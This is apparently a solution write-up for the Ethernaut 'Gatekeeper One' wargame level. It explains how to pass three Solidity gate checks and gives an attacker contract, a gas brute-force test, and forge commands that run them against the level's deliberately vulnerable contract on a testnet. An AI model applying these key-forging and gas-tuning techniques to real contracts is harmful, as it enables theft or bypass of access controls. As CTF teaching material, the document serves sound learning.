<div align="center">
<p align="left">(<a href="https://github.com/Pedrojok01/Ethernaut-Solutions?tab=readme-ov-file#solutions">back</a>)</p>

<img src="../assets/levels/13-gate1.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 13 - Gate Keeper One</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
  - [Modifier 1](#modifier-1)
  - [Modifier 3](#modifier-3)
  - [Modifier 2](#modifier-2)
- [Solution](#solution)
- [Takeaway](#takeaway)

## Objectif

<img src="../assets/requirements/13-gate1-requirements.webp" width="800px"/>

## The hack

From now on, things will get a bit more complicated and will require some more advanced solidity knowledge.

We have 3 modifiers to pass in the `enter(bytes8 _gateKey)` function to beat the Gate Keeper One level. Let's check them one by one.

### Modifier 1

Nothing complicated here, we have seen this in the Telephone level previously. We simply have to call the `enter()` function from an intermediary contract so `tx.origin` will be our EOA and `msg.sender` will be the intermediary contract.

```javascript
 modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

### Modifier 3

```javascript
 modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```

The `gateKey` is a `bytes8` type, which is a fixed-size byte array of length 8. The `gateKey` is constructed by taking the last 16 bits of the `tx.origin` and concatenating them with `0x0001000000000000`.

Let's see how to get there. First, we can remove some noise from the `gateKey` construction:

```javascript
uint64 key64 = uint64(_gateKey);
require(uint32(key64) == uint16(key64);
require(uint32(key64) != key64);
require(uint32(key64) == uint16(uint160(tx.origin));
```

That's better. Now we can see that the `gateKey` is a 64-bit number. Something that will look like this:

> `0x 00000000 00000000`

Based on the third `require` statement, we see that the last 32 bits must be equal to the last 16 bits of `tx.origin`. However, the first 32 bits must be different from the first 32 bits of our key. This means that the `gateKey` is a 64-bit number that has the last 16 bits equal to the last 16 bits of `tx.origin` and the first 32 bits different from the last 32 bits of `tx.origin`.

| Hex  | First 32 bits | Last 32 bits |
| ---- | ------------- | ------------ |
| `0x` | `12345678`    | `ABCDEFGH`   |

When combined, we will get something like `0x12345678ABCDEFGH`. So let's create a function to craft the `gateKey` accordingly:

```javascript
function _constructGateKey() private view returns (bytes8 gateKey) {
        // Get the last 16 bits of tx.origin by converting it to uint160 and then to uint16
        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
        // Concatenate the last 16 bits with 0x0001000000000000
        // Where 0x0001000000000000 is a bunch of 0 with an arbitraty 1 somewhere
        // so the first 32 bits differ from each other;
        // The bitwise OR operator is used to combine the two numbers;
        // The result is cast to bytes8;
        gateKey = bytes8(
            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
        );
        return gateKey;
    }
```

### Modifier 2

```javascript
 modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }
```

We have to make sure that the `gasleft()` is a multiple of 8191. We will have to somehow loop until we get the right amount of gas, and this is why we handle this modifier last. We can write a quick test to find it out:

```javascript
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {GateSkipperOne} from "src/13_GatekeeperOne.sol";

contract TestGateKeeperOne is Test {
    GateSkipperOne private gateSkipperOne;

    function setUp() public {
        gateSkipperOne = new GateSkipperOne(
            0x3D47f75FdB928E3DC0206DC0Dc3470fF79A43fE2
        );
    }

    function test() public {
        for (uint256 i = 100; i < 8191; i++) {
            try gateSkipperOne.attack(i) {
                console.log("gas", i);
                return;
            } catch {}
        }
        revert("No gas match found!");
    }
}
```

We can run the test with the following command:

```bash
forge test -vvvv --fork-url sepolia --match-path test/13_GateKeeperOne.test.sol
```

And we get the following amount: `256`.

## Solution

We now have everything we need to write our contract and call the `enter()` function.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GateSkipperOne {
    address private gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = _gateKeeper;
    }

    function attack(uint256 gas) external {
        bytes8 key = _constructGateKey();

        (bool success, ) = gateKeeper.call{gas: 8191 * 20 + gas}( // gas == 256
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Attack failed");
    }

    function _constructGateKey() private view returns (bytes8 gateKey) {
        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
        gateKey = bytes8(
            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
        );
        return gateKey;
    }
}
```

Run the script with the following command:

```bash
forge script script/13_GateKeeperOne.s.sol:PoC --rpc-url sepolia --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY --watch
```

## Takeaway

- How data type conversion and casting work in Solidity
- Bitwise operators
- Why `gasleft()` can't be used as a source of randomness

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
